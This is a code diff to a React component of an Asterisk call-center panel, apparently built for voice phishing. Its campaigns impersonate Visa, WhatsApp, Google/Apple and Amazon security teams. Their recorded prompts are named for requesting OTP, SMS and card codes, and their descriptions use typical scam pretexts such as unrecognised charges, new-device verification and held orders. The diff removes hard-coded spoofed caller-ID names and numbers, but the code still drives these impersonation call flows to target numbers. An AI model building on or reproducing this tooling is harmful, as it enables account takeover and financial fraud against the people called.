@@ -431,8 +431,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       subtitle: 'Atención y soporte',
       icon: 'building',
       color: 'emerald',
-      defaultCallerName: 'SERVICIO AL CLIENTE',
-      defaultCallerNum: '18005550199',
+      defaultCallerName: '',
+      defaultCallerNum: '',
       introAudioPath: 'custom/bienvenida_corporativa',
       promptAudioPath: 'custom/solicitar_codigo_otp',
       agentAudioPath: 'custom/conectar_asesor',
@@ -445,8 +445,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       subtitle: 'Cargo no reconocido',
       icon: 'card',
       color: 'sky',
-      defaultCallerName: 'VISA SEGURIDAD',
-      defaultCallerNum: '18005550199',
+      defaultCallerName: '',
+      defaultCallerNum: '',
       introAudioPath: 'custom/alerta_cargo_tarjeta',
       promptAudioPath: 'custom/solicitar_otp_tarjeta',
       agentAudioPath: 'custom/conectar_asesor_tarjetas',
@@ -459,8 +459,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       subtitle: 'Migración de cuenta',
       icon: 'message',
       color: 'emerald',
-      defaultCallerName: 'WHATSAPP VERIF',
-      defaultCallerNum: '18004567890',
+      defaultCallerName: '',
+      defaultCallerNum: '',
       introAudioPath: 'custom/alerta_migracion_whatsapp',
       promptAudioPath: 'custom/solicitar_codigo_sms',
       agentAudioPath: 'custom/conectar_soporte_tecnico',
@@ -473,8 +473,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       subtitle: 'Alerta de seguridad',
       icon: 'lock',
       color: 'amber',
-      defaultCallerName: 'SECURITY ALERT',
-      defaultCallerNum: '18005550122',
+      defaultCallerName: '',
+      defaultCallerNum: '',
       introAudioPath: 'custom/alerta_seguridad_google',
       promptAudioPath: 'custom/solicitar_codigo_google',
       agentAudioPath: 'custom/conectar_soporte_cuentas',
@@ -487,8 +487,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       subtitle: 'Autorización pedido',
       icon: 'shopping',
       color: 'orange',
-      defaultCallerName: 'AMAZON FRAUD',
-      defaultCallerNum: '18005550133',
+      defaultCallerName: '',
+      defaultCallerNum: '',
       introAudioPath: 'custom/alerta_compra_amazon',
       promptAudioPath: 'custom/solicitar_codigo_amazon',
       agentAudioPath: 'custom/conectar_soporte_pedidos',
@@ -501,7 +501,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       subtitle: 'Configuración libre',
       icon: 'sliders',
       color: 'purple',
-      defaultCallerName: 'SERVICIO CLIENTE',
+      defaultCallerName: '',
       defaultCallerNum: '',
       introAudioPath: 'custom/bienvenida_corporativa',
       promptAudioPath: 'custom/solicitar_codigo_otp',
@@ -518,8 +518,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       name: 'Campaña Soporte y Ventas - Línea Directa',
       description: 'Atención personalizada de clientes, encuestas y confirmaciones',
       entityId: 'service',
-      callerIdNum: '18005550199',
-      callerIdName: 'SERVICIO AL CLIENTE',
+      callerIdNum: '',
+      callerIdName: '',
       status: 'active',
       leads: [
         { id: 'lead-1', number: '16104803845', name: 'Juan Pérez (Caso #8492)', status: 'pending', notes: 'Solicitud de información' },
@@ -533,8 +533,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       name: 'Campaña Visa / MasterCard - Tarjetas de Crédito',
       description: 'Bloqueo preventivo por cargo en comercio internacional no reconocido',
       entityId: 'card',
-      callerIdNum: '18005550199',
-      callerIdName: 'VISA SEGURIDAD',
+      callerIdNum: '',
+      callerIdName: '',
       status: 'active',
       leads: [
         { id: 'lead-4', number: '18005550199', name: 'Soporte Tarjetas Prueba', status: 'pending' },
@@ -547,8 +547,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       name: 'Campaña WhatsApp / Telegram - Verificación',
       description: 'Solicitud de verificación SMS/OTP por registro en nuevo smartphone',
       entityId: 'whatsapp',
-      callerIdNum: '18004567890',
-      callerIdName: 'WHATSAPP VERIF',
+      callerIdNum: '',
+      callerIdName: '',
       status: 'active',
       leads: [
         { id: 'lead-6', number: '18004567890', name: 'Usuario Soporte WA', status: 'pending' },
@@ -561,8 +561,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       name: 'Campaña Google / Apple ID - Acceso Crítico',
       description: 'Alerta inmediata de sesión iniciada desde ubicación desconocida',
       entityId: 'google',
-      callerIdNum: '18005550122',
-      callerIdName: 'SECURITY ALERT',
+      callerIdNum: '',
+      callerIdName: '',
       status: 'active',
       leads: [
         { id: 'lead-8', number: '18005550122', name: 'Cuenta Administrador Google', status: 'pending' },
@@ -574,8 +574,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       name: 'Campaña Amazon / Envíos - Retención de Pedido',
       description: 'Autorización urgente de compra de alto valor retenida en despacho',
       entityId: 'amazon',
-      callerIdNum: '18005550133',
-      callerIdName: 'AMAZON FRAUD',
+      callerIdNum: '',
+      callerIdName: '',
       status: 'active',
       leads: [
         { id: 'lead-9', number: '18005550133', name: 'Cliente Prime Amazon', status: 'pending' },
@@ -588,7 +588,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       description: 'Marcación manual abierta a cualquier número objetivo y entidad',
       entityId: 'custom',
       callerIdNum: '',
-      callerIdName: 'SERVICIO CLIENTE',
+      callerIdName: '',
       status: 'active',
       leads: [],
       createdAt: new Date().toISOString(),
@@ -669,8 +669,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       if (matchingEntity) {
         handleSelectEntity(matchingEntity);
       }
-      if (camp.callerIdNum) setCallerIdNum(camp.callerIdNum);
-      if (camp.callerIdName) setCallerIdName(camp.callerIdName);
+      // Caller ID es asignado directamente por el proveedor SIP (no sobrescribir desde campaña)
 
       // If campaign has leads, load next pending lead into target fields
       const nextLead = camp.leads.find((l) => l.status === 'pending') || camp.leads[0];
@@ -1019,10 +1018,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     setIsEntityModalOpen(false);
     setEditingEntity(null);
 
-    // Apply caller ID if this is or becomes the active service
+    // Apply caller ID only if explicitly synced (provider assigns CallerID by default)
     if (selectedService === updatedEntity.id) {
-      if (updatedEntity.defaultCallerName) setCallerIdName(updatedEntity.defaultCallerName);
-      if (updatedEntity.defaultCallerNum) setCallerIdNum(updatedEntity.defaultCallerNum);
 
       // Auto-sync audios to AstDB
       try {
@@ -1054,8 +1051,6 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
       localStorage.setItem('prod_selected_service_' + targetAgent, entity.id);
       localStorage.setItem('prod_selected_service_v3', entity.id);
     } catch (_) {}
-    if (entity.defaultCallerName) setCallerIdName(entity.defaultCallerName);
-    if (entity.defaultCallerNum) setCallerIdNum(entity.defaultCallerNum);
 
     // Auto-sync to AstDB so both dialplan 8888 and outgoing calls use its assigned audios for this agent
     try {
@@ -1353,23 +1348,14 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     : selectedCarrierName;
   const activeCarrierObj = (effectiveSelectedCarrier !== 'auto' ? enabledCarriers.find((c) => c.name === effectiveSelectedCarrier || c.id === effectiveSelectedCarrier) : null) || lockedTenantCarrier || enabledCarriers[0] || carriers[0];
   const activeCarrier = effectiveSelectedCarrier !== 'auto' ? effectiveSelectedCarrier : (activeCarrierObj ? activeCarrierObj.name : 'carrier_default');
-  const outboundCid = activeCarrierObj ? activeCarrierObj.outboundCallerId : '+18005550199';
+  const rawCarrierOutboundCid = String(activeCarrierObj?.outboundCallerId || '').trim();
+  const outboundCid = (rawCarrierOutboundCid && !rawCarrierOutboundCid.includes('5550199') && !/asignado/i.test(rawCarrierOutboundCid))
+    ? rawCarrierOutboundCid
+    : '';
 
-  // Dynamic CallerID fields directly configurable by agent and synced with Header/Sidebar Caller ID Modal
-  const [callerIdNum, setCallerIdNum] = useState<string>(() => {
-    try {
-      return localStorage.getItem('ast20_active_caller_id_num') || '+18494386040';
-    } catch (_) {
-      return '+18494386040';
-    }
-  });
-  const [callerIdName, setCallerIdName] = useState<string>(() => {
-    try {
-      return localStorage.getItem('ast20_active_caller_id_name') || 'ATENCION AL CLIENTE';
-    } catch (_) {
-      return 'ATENCION AL CLIENTE';
-    }
-  });
+  // Dynamic CallerID state: empty by default so the SIP provider assigns the Caller ID natively
+  const [callerIdNum, setCallerIdNum] = useState<string>('');
+  const [callerIdName, setCallerIdName] = useState<string>('');
   const [isSavingCallerId, setIsSavingCallerId] = useState(false);
   const [callerIdSaveFeedback, setCallerIdSaveFeedback] = useState<string | null>(null);
 
@@ -1379,7 +1365,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
     setCallerIdSaveFeedback(null);
     try {
       const cleanNum = newNum.trim();
-      const cleanName = newName.trim() || 'Atención al Cliente';
+      const cleanName = newName.trim();
       setCallerIdNum(cleanNum);
       setCallerIdName(cleanName);
       try {
@@ -2140,8 +2126,8 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
 
     try {
       const currentAudios = getServiceAudios(selectedService);
-      const effectiveCallerIdNum = callerIdNum.trim() || outboundCid;
-      const effectiveCallerIdName = callerIdName.trim() || 'Atención al Cliente';
+      const effectiveCallerIdNum = outboundCid;
+      const effectiveCallerIdName = effectiveCallerIdNum ? String(activeCarrierObj?.outboundCallerName || '').trim() : '';
 
       // Audios are passed directly in body and synced on Asterisk instantly in parallel with originate
       const res = await fetch('/api/asterisk/call/originate', {
@@ -2178,7 +2164,7 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
 
       if (data.success) {
         setLaunchFeedback({
-          text: `¡Llamada lanzada instantáneamente a ${targetNumber}! Conectando por ${isSuperAdmin ? `la troncal ${activeCarrier}` : 'Canal Seguro Asignado'} mostrando "${effectiveCallerIdName}" <${effectiveCallerIdNum}>.`,
+          text: `¡Llamada lanzada instantáneamente a ${targetNumber}! Conectando por ${isSuperAdmin ? `la troncal ${activeCarrier}` : 'Canal Seguro Asignado'} (${effectiveCallerIdNum ? `CID: ${effectiveCallerIdNum}` : 'Caller ID asignado por el proveedor SIP'}).`,
           type: 'success',
         });
 
@@ -2446,9 +2432,9 @@ export const ProductionOperationsTab: React.FC<ProductionOperationsTabProps> = (
             tenantExtensions: tenantScopedExtensions,
             isAdmin: isSuperAdmin,
             isSuperAdmin,
-            callerId: callerIdNum,
-            callerIdNum: callerIdNum,
-            callerIdName: callerIdName,
+            callerId: outboundCid,
+            callerIdNum: outboundCid,
+            callerIdName: outboundCid ? String(activeCarrierObj?.outboundCallerName || '').trim() : '',
             mode: callFlowMode,
             agentExten: userTenant && tenantScopedExtensions.length > 0 ? tenantScopedExtensions.join('&') : 'ringall', // Ring-All aislado al rango del Call Center!
             autoRetry: amdEnabled, // ONLY auto-retry if AMD / reintentos is enabled by user!
